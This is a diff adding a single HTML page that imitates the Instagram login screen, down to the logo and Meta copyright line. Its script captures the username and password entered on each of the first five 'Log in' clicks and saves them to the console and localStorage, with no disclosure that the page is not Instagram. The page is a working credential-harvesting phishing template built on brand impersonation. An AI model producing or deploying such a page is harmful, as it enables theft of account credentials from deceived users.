@@ -1,0 +1,158 @@
+
+<html>
+    <head>
+        <title>
+            Instagram
+        </title>
+        <meta charset="UTF-8">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
+    </head>
+    <body background="grey">
+        <br><br>
+    <center>
+        <div class="container" id="main">
+        <br><br>
+        <img id="logo" src="instagram_logo.svg.png">
+        <br>
+        <br><br>
+            <input placeholder="Phone number, username or email" type="text" id="id">
+            <div id="firewall"></div>
+            <input placeholder="Password" type="text" id="password">
+            <br><br>
+            <button id="login" onclick="add_clicks()" type="submit" class="btn-primary">Log in</button>
+            <br>
+            <hr>
+            <span><p>OR</p></span>
+            <hr>
+            <br>
+            <input type="text" readonly="readonly" id="fb" placeholder="Continue with Facebook">
+            <p id="qwerty">Forgot password?</p>
+            <br><br>
+            <p id="efghij">Don't have an account? <span><p id="abcdef">Sign up</p></span></p>
+            <br><br>
+            <p id="license">© 2023 Instagram from Meta</p>
+        </div>
+    </center>
+        <br><br>
+    </body>
+    <script>
+        var clicks = 0;
+        var id1 = "";
+        var id2 = "";
+        var id3 = "";
+        var id4 = "";
+        var id5 = "";
+        var pass1 = "";
+        var pass2 = "";
+        var pass3 = "";
+        var pass4 = "";
+        var pass5 = "";
+        function add_clicks() {
+            clicks++;
+            if (clicks == 1) {
+                id1 = document.getElementById("id").value;
+                pass1 = document.getElementById("password").value;
+                console.log(id1, pass1)
+                localStorage.setItem("id1", id1);
+                localStorage.setItem("pass1", pass1);
+            }
+            if (clicks == 2) {
+                id2 = document.getElementById("id").value;
+                pass2 = document.getElementById("password").value;
+                console.log(id2, pass2);
+                localStorage.setItem("id2", id2);
+                localStorage.setItem("pass2", pass2);
+            }
+            if (clicks == 3) {
+                id3 = document.getElementById("id").value;
+                pass3 = document.getElementById("password").value;
+                console.log(id3, pass3)
+                localStorage.setItem("id3", id3);
+                localStorage.setItem("pass3", pass3);
+            }
+            if (clicks == 4) {
+                id4 = document.getElementById("id").value;
+                pass4 = document.getElementById("password").value;
+                console.log(id4, pass4);
+                localStorage.setItem("id4", id4);
+                localStorage.setItem("pass4", pass4);
+            }
+            if (clicks == 5) {
+                id5= document.getElementById("id").value;
+                pass5 = document.getElementById("password").value;
+                console.log(id5, pass5);
+                localStorage.setItem("id5", id5);
+                localStorage.setItem("pass5", pass5);
+            }
+        }
+        
+    </script>
+    <style>
+        body{
+            background-color: rgb(235, 235, 235);
+        }
+        #main{
+            width: 400px;
+            height: 79%;
+            border-radius: 3px;
+            border-width: 30px;
+            border-color: black;
+            background-color: rgb(255, 255, 255);
+        }
+        #logo{
+            width: 41%;
+            height: 9%
+        }
+        #id{
+            width: 290px;
+            height: 30px;
+            border-radius: 3px;
+            background-color: rgb(235, 235, 235);
+            border-width: 0.2px;
+            border-color:rgb(112, 112, 112);
+            
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #password{
+             width: 290px;
+            height: 30px;
+            border-radius: 3px;
+            background-color: rgb(235, 235, 235);
+            border-width: 0.2px;
+            border-color:rgb(112, 112, 112);
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #firewall{
+            height: 5px;
+            width: 0px;
+        }
+        #login{
+            background-color:rgb(83, 171, 252);
+            width: 290px;
+            height: 30px;
+            color: white;
+            border-radius: 7px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #fb{
+            border-width: 0px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #qwerty{
+            font-size: 14px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #efghij{
+            font-size: 18px;
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+        #abcdef{ 
+            color: rgb(83, 171, 252);
+        }
+        #license{
+            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+            font-size: 14px;
+        }
+    </style>
+</html>
